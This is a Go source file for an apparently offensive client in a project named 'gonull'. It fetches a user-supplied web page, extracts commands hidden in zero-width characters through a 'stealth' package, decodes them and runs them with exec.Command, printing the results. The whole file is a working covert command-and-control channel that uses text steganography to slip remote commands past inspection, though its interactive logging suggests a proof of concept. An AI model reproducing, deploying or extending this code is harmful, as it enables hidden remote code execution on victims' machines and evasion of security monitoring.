package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"gonull/internal/common/stealth"
)

func main() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile) // More informative logging
	log.Println("Client starting...")

	reader := bufio.NewReader(os.Stdin)

	// 1. Get the URL from the user
	fmt.Print("Enter the URL to fetch content from: ")
	urlInput, err := reader.ReadString('\n')
	if err != nil {
		log.Fatalf("Error reading URL from stdin: %v", err)
	}
	urlInput = strings.TrimSpace(urlInput)

	if urlInput == "" {
		log.Println("No URL provided. Exiting.")
		return
	}

	// 2. Fetch content from the URL
	log.Printf("Attempting to fetch content from URL: %s", urlInput)
	resp, err := http.Get(urlInput)
	if err != nil {
		log.Printf("Error fetching URL %s: %v", urlInput, err) // Changed from Fatalf to allow more context
		return                                                 // Exit if fetching fails
	}
	defer resp.Body.Close()

	log.Printf("Received response from %s - Status: %s (Code: %d)", urlInput, resp.Status, resp.StatusCode)
	if resp.StatusCode != http.StatusOK {
		// Attempt to read and log part of the body for non-OK responses, might give clues
		bodyBytes, readErr := io.ReadAll(io.LimitReader(resp.Body, 512)) // Limit to 512 bytes
		if readErr != nil {
			log.Printf("Additionally, failed to read response body for %s (status %d): %v", urlInput, resp.StatusCode, readErr)
		} else if len(bodyBytes) > 0 {
			log.Printf("Response body snippet for %s (status %d):\n%s", urlInput, resp.StatusCode, string(bodyBytes))
		}
		log.Printf("Exiting due to non-OK HTTP status: %d", resp.StatusCode)
		return
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error reading response body from %s: %v", urlInput, err)
	}
	htmlContent := string(bodyBytes)

	if htmlContent == "" {
		log.Println("Fetched content from URL is empty. No data to process. Exiting.")
		return
	}
	log.Printf("Successfully fetched %d bytes from %s", len(htmlContent), urlInput)

	// 3. Extract the null-width characters (the encoded command bits)
	log.Println("Attempting to extract hidden command from fetched content...")
	extractedBits := stealth.ExtractFromText(htmlContent)

	if extractedBits == "" {
		log.Println("No hidden command markers or payload found in the fetched content.")
		// Consider logging a snippet of htmlContent if it's small enough and extraction fails, for debugging.
		// if len(htmlContent) < 1024 { log.Printf("Searched content: %s", htmlContent) }
		return
	}
	log.Printf("Extracted %d null-width characters representing potential command bits.", len(extractedBits))

	// 4. Decode the command
	log.Println("Attempting to decode extracted bits into a command...")
	decodedCommand, err := stealth.DecodeFromNullWidth(extractedBits)
	if err != nil {
		// This error means the bits themselves (ZWS/ZWNJ sequence) were malformed for byte conversion, e.g. invalid char
		log.Printf("Error decoding command from extracted bits: %v", err)
		log.Printf("Extracted bits (raw): %q", extractedBits) // Show the problematic bits
		return
	}

	if decodedCommand == "" {
		log.Println("Decoded command is an empty string. This could mean the extracted bits were insufficient (e.g., not a multiple of 8) or represented an empty string.")
		log.Printf("Extracted bits (raw) that resulted in empty command: %q", extractedBits)
		// No need to proceed to execution if command is empty.
	}

	// 5. Display the decoded command (for clarity, before execution)
	fmt.Println("\n--- Decoded Command ---")
	fmt.Printf("Command: '%s'\n", decodedCommand)
	fmt.Println("--- End of Command --- ")

	// 6. Execute the command if it's not empty
	if decodedCommand != "" {
		log.Printf("Preparing to execute command: '%s'", decodedCommand)

		parts := strings.Fields(decodedCommand)
		if len(parts) == 0 { // Should not happen if decodedCommand is not empty, but good check
			log.Println("Decoded command is non-empty but produced no executable parts. Skipping execution.")
			return
		}
		commandName := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}

		log.Printf("Executing: '%s' with arguments: %v", commandName, args)
		cmd := exec.Command(commandName, args...)
		output, execErr := cmd.CombinedOutput() // Captures both stdout and stderr

		fmt.Println("\n--- Command Output ---")
		if execErr != nil {
			// execErr can be an ExitError (command ran but exited non-zero) or other error (e.g., command not found)
			log.Printf("Error during command execution for '%s': %v", decodedCommand, execErr)
			if exitErr, ok := execErr.(*exec.ExitError); ok {
				log.Printf("Command exited with status: %s", exitErr.ProcessState.String())
				// The CombinedOutput already includes stderr, so printing exitErr.Stderr is often redundant here.
			}
		}
		if len(output) > 0 {
			fmt.Print(string(output))
		} else {
			log.Println("(Command produced no output)")
		}
		fmt.Println("--- End of Output --- ")

	} else {
		log.Println("Decoded command was empty. Nothing to execute.")
	}

	log.Println("Client finished operation.")
}
